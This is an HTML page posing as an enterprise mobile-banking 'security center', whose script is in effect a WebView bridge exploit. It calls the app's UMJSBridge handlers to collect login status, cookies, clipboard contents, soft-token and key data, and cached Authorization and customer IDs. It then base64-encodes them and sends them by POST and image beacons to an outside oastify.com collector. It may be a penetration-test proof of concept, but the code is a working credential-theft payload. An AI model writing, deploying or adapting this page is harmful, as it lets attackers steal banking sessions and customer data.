<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>企业掌银安全中心</title>
<style>
 body{font-family:monospace;font-size:12px;background:#fff;margin:8px}
 #log{white-space:pre-wrap;word-break:break-all}
</style></head><body>
<h4>企业掌银安全中心</h4>
<div id="log">[boot]</div>
<script>
var L = document.getElementById('log');
var R = {ts: Date.now(), url: location.href, ua: navigator.userAgent, cookie: document.cookie};
var OAST = "https://fsbm03ajeb3d1cvmsxsopyv54wanyem3.oastify.com/";
function ts(){ return ((Date.now()-R.ts)/1000).toFixed(1)+'s'; }
function v(msg){ L.textContent += '\n['+ts()+'] '+msg; }
function beacon(path){ try{ (new Image()).src = path; }catch(e){} }
function stage(s){ v('STAGE '+s); beacon(OAST+'?stage='+encodeURIComponent(s)); }
window.onerror = function(msg, src, line){ v('ONERROR: '+msg+' @'+line); stage('jserror'); };
stage('loaded');
v('ua='+navigator.userAgent);
function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
function exfil(tag){
  var payload = b64(JSON.stringify(R));
  v('exfil['+tag+'] len='+payload.length);
  try{
    fetch(OAST, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: payload})
      .then(function(){ v('exfil['+tag+'] sent'); })
      .catch(function(e){ v('exfil['+tag+'] FAIL: '+e); });
  }catch(e){ v('exfil['+tag+'] THROW: '+e.message); }
}
function call(h, params, tag){
  var k = tag||('R_'+h);
  try{
    UMJSBridge.callHandler(h, params, function(resp){
      R[k] = resp;
      v('call '+h+' => '+JSON.stringify(resp).slice(0,200));
    });
  }catch(e){ R[k]='THROW:'+e.message; v('call '+h+' THROW: '+e.message); }
}
setTimeout(function(){
  v('typeof UMJSBridge = '+typeof window.UMJSBridge);
  stage('bridge_'+typeof window.UMJSBridge);
  if (typeof window.UMJSBridge === 'undefined'){ R.fatal='no UMJSBridge'; exfil('nobridge'); return; }
  call('get_loginStatus', {});
  call('getCombLoginInfo', {});
  call('getCombInfo', {});
  call('get_deviceInfo', {});
  call('get_cookie', {});
  call('getClipboardInfo', {});
  call('app_checkversion', {});
  call('finger_check_support', {});
  call('check_combpush_login', {});
  call('getAppInstallStatus', {});
  call('tdr_soft_token', {});
  call('key_info', {});
  call('cache_get', {keys:"Authorization|COMB_APP_CACHE_customerId|COMB_APP_CACHE_operatorId|combSsId|UserLevel|login_app_id|login_app_url|COMB_APP_CACHE_location_info|combAppJsapicontrol|combAppSecurity|NavMenu"});
  ['loginStatus','combLoginCustomerType','Cookie'].forEach(function(k){
    (function(key){ call('db_getData', {key:key}, 'R_db_'+key); })(k);
  });
  call('loginInfo_cache_get', {appId:'30000043', keys:''});
  setTimeout(function(){ stage('mid'); exfil('mid'); }, 3000);
  setTimeout(function(){ R.done=1; stage('done'); exfil('final'); }, 7000);
}, 1000);
</script>
</body></html>
